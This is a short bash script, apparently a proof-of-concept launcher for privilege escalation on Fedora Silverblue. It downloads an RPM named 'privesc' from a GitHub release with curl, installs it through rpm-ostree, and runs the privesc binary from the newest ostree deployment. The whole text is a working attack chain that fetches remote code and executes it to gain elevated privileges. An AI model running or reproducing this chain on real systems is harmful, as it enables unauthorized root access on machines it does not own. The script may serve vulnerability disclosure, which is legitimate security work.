#!/usr/bin/env bash

rpm-ostree install <(curl https://github.com/rohanssrao/silverblue-privesc/releases/latest/download/privesc-0.0.1.x86_64.rpm)
$(ls -td /ostree/deploy/fedora/deploy/*/ | head -1)/usr/bin/privesc
